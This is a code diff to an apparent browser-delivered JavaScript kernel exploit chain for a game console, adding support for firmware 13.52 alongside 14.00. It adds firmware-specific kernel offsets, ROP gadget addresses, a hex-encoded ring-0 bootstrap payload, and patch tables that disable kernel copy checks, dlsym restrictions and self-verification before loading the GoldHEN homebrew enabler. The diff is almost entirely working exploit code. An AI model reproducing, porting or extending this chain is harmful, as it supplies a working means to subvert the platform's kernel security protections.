@@ -42,13 +42,30 @@ const S = {
   cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
-/* offsets into the kernel image, firmware 14.00 */
-const K = {
-  anchor:    0x00e6c60,   /* the lock the leak hands us */
-  swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
-  prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
-  rootvnode: 0x2136e90,
+/* Offsets into the kernel image, one table per firmware. Everything that
+   moved between 13.52 and 14.00 lives here; everything that did not is
+   written once. The 13.52 column was derived offline from the two kernel
+   images and cross-checked -- see the project notes. */
+const FIRMWARE = {
+  "14.00": {
+    anchor:    0x00e6c60,   /* the lock the leak hands us */
+    swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
+    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
+    rootvnode: 0x2136e90,
+    padding:   0x0b39d98,   /* start of the zero run behind kernel text */
+    ghKmem:    0x0466540,
+  },
+  "13.52": {
+    anchor:    0x00e6c60,   /* same function, same place */
+    swap_rbp:  0x0a80c98,   /* 4e 95 c3, the only match in text */
+    prison0:   0x111fa18,   /* same, decoded from the same instruction */
+    rootvnode: 0x2136e90,
+    padding:   0x0b39ad8,
+    ghKmem:    0x0466290,
+  },
 };
+
+let K = null;
 
 /* offsets into libSceLibcInternal, with the bytes that must be found there */
 const GADGETS = {
@@ -91,14 +108,45 @@ const TUNE = {
    those, and one short of that never lands in the right bucket. */
 const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];
 
-const BOOTSTRAP =
-    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
-  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
-  + "20c0480d000001000f22c031c0c3";
+/* The bootstrap carries its kernel addresses inside the machine code, so it
+   is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
+   write targets moved -- the two 0x33 -> 0x37 immediates. */
+const BOOTSTRAP_TABLE = {
+  "14.00":
+      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.52":
+      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
+    + "20c0480d000001000f22c031c0c3",
+};
 
-const PATCHES = [
+let BOOTSTRAP = null;
+
+/* Pick the tables for a firmware. Returns false for one we have no kernel
+   stage for -- the caller must not go on, because every address below is
+   then simply wrong. */
+let FW_KEY = "";
+
+function setFirmware(fw) {
+  const f = FIRMWARE[fw];
+  if (!f || !PATCH_TABLE[fw] || !BOOTSTRAP_TABLE[fw]) return false;
+  K = f;
+  PADDING = f.padding;
+  PATCHES = PATCH_TABLE[fw];
+  BOOTSTRAP = BOOTSTRAP_TABLE[fw];
+  GH.rvaKmem = f.ghKmem;
+  FW_KEY = fw;
+  return true;
+}
+
+const PATCH_TABLE = {
+  "14.00": [
   [0x0000acd, "eb",       "bcopy"],
   [0x02bd79d, "eb",       "bzero"],
   [0x02bd7e1, "eb",       "pagezero"],
@@ -114,7 +162,27 @@ const PATCHES = [
   [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
   [0x0628684, "eb00",     "self verification"],
   [0x0628f6f, "eb00",     "delayed panic on suspend"],
-];
+  ],
+  "13.52": [
+  [0x0000acd, "eb",       "bcopy"],
+  [0x02bd4ed, "eb",       "bzero"],
+  [0x02bd531, "eb",       "pagezero"],
+  [0x02bd5ad, "eb",       "memcpy"],
+  [0x02bd5f1, "eb",       "pagecopy"],
+  [0x02bd79d, "eb",       "copyin"],
+  [0x02bdc4d, "eb",       "copyinstr"],
+  [0x02bdd1d, "eb",       "copystr"],
+  [0x01b77a3, "eb04",     "dlsym, first check"],
+  [0x01b77b3, "eb04",     "dlsym, second check"],
+  [0x01b77d3, "90e9",     "dlsym, nop and jump"],
+  [0x01b7264, "90e9",     "load_prx"],
+  [0x01b7818, "90e93c01", "dlsym, open it to every caller"],
+  [0x06283c4, "eb00",     "self verification"],
+  [0x0628caf, "eb00",     "delayed panic on suspend"],
+  ],
+};
+
+let PATCHES = null;
 
 /* ------------------------------------------------------------- the host */
 
@@ -815,11 +883,15 @@ async function runPatchSet(room) {
   const c = host();
   let pset = null;
   try {
-    const r2 = await fetch("patchset.bin");
+    /* One set per firmware. The blob writes fixed kernel addresses -- 57 of
+       them on 14.00 -- so the wrong one does not merely fail, it writes into
+       a kernel that has those addresses somewhere else. */
+    const r2 = await fetch("patchset-" + FW_KEY.replace(".", "") + ".bin");
     if (r2.ok) pset = new Uint8Array(await r2.arrayBuffer());
   } catch (e) {}
   if (!pset || !pset.length) {
-    say("[g] patchset.bin not available -- GoldHEN would run without the patches it expects");
+    say("[g] no patch set for firmware " + FW_KEY
+        + " -- GoldHEN will not be started without it");
     return false;
   }
   if (pset.length > 0x400 - 0xc0) {
@@ -1070,7 +1142,7 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
   /* Only the trampoline page is ever entered from this mapping. Executability
      here is per page, and that is measured, not assumed: page 0x47000 carries
      ring 0 code, page 0 does not -- a three byte probe there took the console
-     (02.11. 14:27). So the gate stub and the trampoline live at 0x47c00/0x47c40
+     down. So the gate stub and the trampoline live at 0x47c00/0x47c40
      and nothing else from this image is ever jumped to. */
   codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
 
@@ -1225,7 +1297,7 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
 
    In a browser this is not optional and not something to do later: the page
    can go away at any moment, and that moment is the one that hangs. */
-const PADDING = 0x0b39d98;
+let PADDING = 0;   /* set by setFirmware */
 const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
 const RET0 = 0x00c3c031;             /* xor eax,eax ; ret */
 
@@ -1390,6 +1462,10 @@ function teardown(k, kbase, ofs, devs, queues, room) {
    a unit is only spent when its clone is freed, and nothing is freed here. */
 export function probeAfterglow(ctx) {
   STATE.ctx = ctx;
+  if (!setFirmware(ctx.fw)) {
+    ctx.mark("AG", "no kernel stage for firmware " + ctx.fw + " -- refusing");
+    return { ok: false, reasons: ["unsupported firmware " + ctx.fw] };
+  }
   const out = { ok: false, reasons: [] };
   const no = function (why) { out.reasons.push(why); };
 
@@ -2032,6 +2108,12 @@ async function attempt(ctx, opts) {
    and costs only triggers. A spent budget, or anything that already touched
    the kernel, is not retried. */
 export async function runAfterglow(ctx, opts) {
+  /* Every address below is firmware specific. Without a table for this one
+     the chain would write 14.00 offsets into a different kernel. */
+  if (!setFirmware(ctx.fw)) {
+    ctx.mark("AG", "no kernel stage for firmware " + ctx.fw + " -- refusing");
+    return false;
+  }
   const max = (opts && opts.tries) || 4;
   for (let n = 1; n <= max; n++) {
     const r = await attempt(ctx, opts);
